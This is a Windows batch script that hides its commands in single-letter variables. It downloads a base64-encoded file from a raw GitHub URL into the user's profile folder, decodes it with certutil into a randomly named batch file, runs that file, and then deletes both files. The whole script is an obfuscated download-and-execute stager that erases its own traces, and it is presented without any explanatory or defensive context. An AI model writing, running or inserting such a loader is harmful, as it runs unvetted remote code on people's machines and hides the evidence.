@echo off
setlocal enabledelayedexpansion
set "a=%USERPROFILE%"&set "b=%RANDOM%"&set "c=.b64"&set "d=%RANDOM%"&set "e=.bat"&set "f=https://raw.githubusercontent.com/raghudtrees/dbr/refs/heads/main/es"&set "g=curl"&set "h=Cache-Control: no-cache"&set "i=certutil"&set "j=-decode"&set "k=cls"&set "l=call"&set "m=del"&set "n=timeout"&set "o=5"&set "p=nobreak"&set "q=exit"
%g% -H "%h%" -o "!a!\!b!!c!" "%f%" && %k% && if not exist "!a!\!b!!c!" (echo Failed to download the file! && %n% /t %o% /%p% > NUL && %q% /b 1)
%i% %j% "!a!\!b!!c!" "!a!\!d!!e!" >nul && %l% "!a!\!d!!e!" && %m% "!a!\!b!!c!" && %m% "!a!\!d!!e!" && endlocal && %q% /b
